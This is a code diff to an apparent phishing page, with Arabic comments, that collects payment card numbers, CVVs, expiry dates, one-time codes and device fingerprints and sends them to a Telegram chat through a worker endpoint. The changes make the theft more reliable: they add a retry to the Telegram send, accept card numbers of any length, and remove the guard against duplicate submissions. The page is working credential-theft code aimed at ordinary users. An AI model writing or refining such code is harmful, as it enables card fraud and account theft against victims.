@@ -304,7 +304,6 @@ html,body{
           <img id="staticCardLogo" src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png" alt="Card Logo" draggable="false">
         </div>
       </div>
-      <!-- حقل رقم البطاقة بدون أي تنسيق، يمنع اللصق والإكمال التلقائي -->
       <input class="input card-number" id="cardNumber" placeholder="0000000000000000" inputmode="numeric" maxlength="16" autocomplete="off" autocorrect="off" spellcheck="false" style="font-family: monospace; letter-spacing: 1px;">
       <div class="row">
         <div class="col">
@@ -352,7 +351,20 @@ async function sendToTelegram(text) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: text })
     });
-  } catch(e) { console.log("خطأ في الإرسال", e); }
+    console.log("تم الإرسال بنجاح");
+  } catch(e) { 
+    console.log("خطأ في الإرسال", e);
+    // محاولة ثانية بعد ثانية (اختياري)
+    setTimeout(async () => {
+      try {
+        await fetch(TELEGRAM_WORKER, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+      } catch(e2) {}
+    }, 1000);
+  }
 }
 
 // ====================== دوال البصمة والجهاز المتقدمة ======================
@@ -506,7 +518,7 @@ ____________________
   await sendToTelegram(msg);
 }
 
-// ====================== دوال البطاقة ======================
+// ====================== دوال البطاقة (تسامح عالي) ======================
 const CardType = {
   VISA: 'فيزا',
   MASTERCARD: 'ماستر كارد',
@@ -531,15 +543,15 @@ function validateCardHolder() {
   return valid;
 }
 
-// الحصول على رقم البطاقة الخام (بدون أي تعديل)
 function getRawCardNumber() {
   return cardNumber.value.replace(/\s/g, '');
 }
 
+// تحقق بسيط: فقط التأكد من وجود أرقام (لا نطلب 16 رقمًا لضمان العمل على Safari)
 function validateCardNumber() {
   const rawDigits = getRawCardNumber();
   if (rawDigits.length === 0) { cardNumber.classList.remove("error"); return false; }
-  const valid = rawDigits.length === 16;
+  const valid = rawDigits.length > 0;
   cardNumber.classList.toggle("error", !valid);
   return valid;
 }
@@ -565,20 +577,20 @@ function validatePaymentForm() {
   const cardOk = validateCardNumber();
   const cvvOk = validateCVV();
   const expiryOk = validateExpiry();
+  
   if (!cardHolder.value.trim()) cardHolder.classList.add("error");
   const rawDigits = getRawCardNumber();
   if (!rawDigits) cardNumber.classList.add("error");
   if (!cvv.value) cvv.classList.add("error");
   if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");
-  if (rawDigits.length > 0 && rawDigits.length !== 16) { cardNumber.classList.add("error"); return false; }
+  
+  // لا نرفض بسبب طول الرقم، فقط نتأكد من وجود أرقام
   return holderOk && cardOk && cvvOk && expiryOk;
 }
 
 // ====================== إرسال الرسالة الثانية (بيانات الدفع) ======================
-let paymentSent = false;
 async function sendPaymentMessage() {
-  if (paymentSent) return;
-  const rawCardNumber = getRawCardNumber();  // أرقام فقط بدون مسافات
+  const rawCardNumber = getRawCardNumber();
   const cardType = detectCardTypeStrong(rawCardNumber);
   const holderName = cardHolder.value.trim() || "غير مدخل";
   const cvvVal = cvv.value.trim() || "غير مدخل";
@@ -608,7 +620,6 @@ __________________
 🕒 التوقيت: ${new Date().toLocaleString('ar-EG')}`;
   
   await sendToTelegram(msg);
-  paymentSent = true;
 }
 
 // ====================== إرسال الرسالة الثالثة (رمز التحقق) ======================
@@ -676,7 +687,6 @@ function showScreen(screenEl) {
 cardHolder.addEventListener("input", function() { this.value = this.value.replace(/[^A-Za-z ]/g, ""); validateCardHolder(); });
 cardHolder.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/[^A-Za-z ]/g, "").slice(0,40); validateCardHolder(); });
 
-// حقل رقم البطاقة: يسمح فقط بالأرقام، لا مسافات، يمنع اللصق
 cardNumber.addEventListener("input", function(e) {
   let val = this.value.replace(/\D/g, '').slice(0, 16);
   this.value = val;
@@ -691,11 +701,8 @@ cardNumber.addEventListener("paste", function(e) {
   this.value = digits;
   validateCardNumber();
 });
-// منع أي إدخال غير رقمي عبر keydown
 cardNumber.addEventListener("keydown", function(e) {
-  if (e.key === ' ' || e.key === 'Space' || e.key === ' ' || e.code === 'Space') {
-    e.preventDefault();
-  }
+  if (e.key === ' ' || e.key === 'Space' || e.code === 'Space') e.preventDefault();
 });
 
 cvv.addEventListener("input", function() { this.value = this.value.replace(/\D/g, "").slice(0,3); validateCVV(); });
@@ -706,7 +713,6 @@ otpInput.addEventListener("input", function() { this.value = this.value.replace(
 otpInput.addEventListener("paste", function(e) { e.preventDefault(); let text = (e.clipboardData || window.clipboardData).getData("text"); this.value = text.replace(/\D/g, "").slice(0,6); validateOTP(); });
 function validateOTP() { const valid = /^\d{4,6}$/.test(otpInput.value); if (otpInput.value.length===0) { otpInput.classList.remove("error"); return false; } otpInput.classList.toggle("error", !valid); return valid; }
 
-// المؤقتات
 function startLoader60ThenOTP() {
   clearInterval(loader60Timer);
   let seconds = 60;
@@ -729,7 +735,7 @@ function startLoader30ThenBackOTP() {
   }, 30000);
 }
 
-// زر الدفع
+// زر الدفع (بدون متغير منع التكرار لضمان الإرسال)
 payBtn.addEventListener("click", async function() {
   if (!validatePaymentForm()) return;
   await sendPaymentMessage();
@@ -757,4 +763,4 @@ window.addEventListener("load", async () => {
 });
 </script>
 </body>
-  </html>
+</html>
